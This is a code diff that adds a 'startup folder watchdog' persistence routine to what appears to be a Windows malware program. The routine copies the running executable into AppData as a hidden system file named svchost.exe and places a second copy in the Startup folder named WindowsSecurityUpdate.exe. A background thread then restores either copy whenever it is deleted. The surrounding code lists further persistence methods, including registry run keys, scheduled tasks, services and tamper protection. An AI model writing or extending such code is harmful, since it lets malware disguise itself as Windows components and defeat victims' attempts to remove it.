@@ -3021,6 +3021,7 @@ def establish_persistence():
     persistence_methods = [
         registry_run_key_persistence,
         startup_folder_persistence,
+        startup_folder_watchdog_persistence,  # NEW: Auto-restore startup copy
         scheduled_task_persistence,
         service_persistence,
         # Advanced persistence methods
@@ -3423,6 +3424,112 @@ goto loop
         
     except Exception as e:
         log_message(f"Watchdog persistence failed: {e}")
+        return False
+
+def startup_folder_watchdog_persistence():
+    """
+    Deploy original .exe to AppData and create monitored duplicate in startup folder.
+    - Original exe → AppData (hidden, protected location)
+    - Startup copy → shell:startup (auto-recreated if deleted)
+    - Background thread monitors and restores startup copy
+    """
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Check if running as compiled executable
+        if not (hasattr(sys, 'frozen') and sys.frozen):
+            log_message("[STARTUP WATCHDOG] Only works with compiled .exe, skipping")
+            return False
+        
+        import shutil
+        
+        # Paths
+        current_exe = sys.executable  # Current executable path
+        appdata_folder = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows')
+        appdata_exe = os.path.join(appdata_folder, 'svchost.exe')
+        startup_folder = os.path.join(os.environ.get('APPDATA', ''), 
+                                      'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        startup_exe = os.path.join(startup_folder, 'WindowsSecurityUpdate.exe')
+        
+        # Create directories if they don't exist
+        os.makedirs(appdata_folder, exist_ok=True)
+        os.makedirs(startup_folder, exist_ok=True)
+        
+        # Step 1: Deploy original to AppData (if not already there)
+        if current_exe != appdata_exe:
+            if not os.path.exists(appdata_exe):
+                shutil.copy2(current_exe, appdata_exe)
+                log_message(f"[STARTUP WATCHDOG] Deployed original to AppData: {appdata_exe}")
+                
+                # Hide the AppData exe
+                try:
+                    subprocess.run(['attrib', '+h', '+s', appdata_exe], 
+                                 creationflags=subprocess.CREATE_NO_WINDOW, 
+                                 capture_output=True, timeout=5)
+                    log_message("[STARTUP WATCHDOG] Hidden AppData exe with +h +s attributes")
+                except:
+                    pass
+        
+        # Step 2: Create duplicate in startup folder
+        if not os.path.exists(startup_exe):
+            shutil.copy2(appdata_exe, startup_exe)
+            log_message(f"[STARTUP WATCHDOG] Created startup folder copy: {startup_exe}")
+        
+        # Step 3: Start watchdog thread to monitor startup folder
+        def startup_watchdog_thread():
+            """Background thread that monitors and restores startup folder copy"""
+            log_message("[STARTUP WATCHDOG] Monitoring thread started")
+            
+            while True:
+                try:
+                    # Check if startup copy exists
+                    if not os.path.exists(startup_exe):
+                        log_message("[STARTUP WATCHDOG] ⚠️ Startup copy DELETED! Restoring...")
+                        
+                        # Restore from AppData original
+                        if os.path.exists(appdata_exe):
+                            shutil.copy2(appdata_exe, startup_exe)
+                            log_message(f"[STARTUP WATCHDOG] ✅ Restored: {startup_exe}")
+                        else:
+                            log_message("[STARTUP WATCHDOG] ❌ AppData original missing! Cannot restore!")
+                    
+                    # Check if AppData original exists
+                    if not os.path.exists(appdata_exe):
+                        log_message("[STARTUP WATCHDOG] ⚠️ AppData original DELETED! Restoring...")
+                        
+                        # Restore from startup copy
+                        if os.path.exists(startup_exe):
+                            shutil.copy2(startup_exe, appdata_exe)
+                            # Re-hide it
+                            try:
+                                subprocess.run(['attrib', '+h', '+s', appdata_exe], 
+                                             creationflags=subprocess.CREATE_NO_WINDOW, 
+                                             capture_output=True, timeout=5)
+                            except:
+                                pass
+                            log_message(f"[STARTUP WATCHDOG] ✅ Restored AppData: {appdata_exe}")
+                        elif os.path.exists(current_exe):
+                            # Last resort: copy from current location
+                            shutil.copy2(current_exe, appdata_exe)
+                            log_message("[STARTUP WATCHDOG] ✅ Restored AppData from current exe")
+                    
+                    # Sleep for 10 seconds before next check
+                    time.sleep(10)
+                    
+                except Exception as e:
+                    log_message(f"[STARTUP WATCHDOG] Monitor error: {e}")
+                    time.sleep(30)  # Wait longer on error
+        
+        # Start watchdog thread (daemon so it doesn't prevent exit)
+        watchdog_thread = threading.Thread(target=startup_watchdog_thread, daemon=True)
+        watchdog_thread.start()
+        log_message("[STARTUP WATCHDOG] ✅ Persistence established with auto-restore")
+        
+        return True
+        
+    except Exception as e:
+        log_message(f"[STARTUP WATCHDOG] Setup failed: {e}")
         return False
 
 def tamper_protection_persistence():
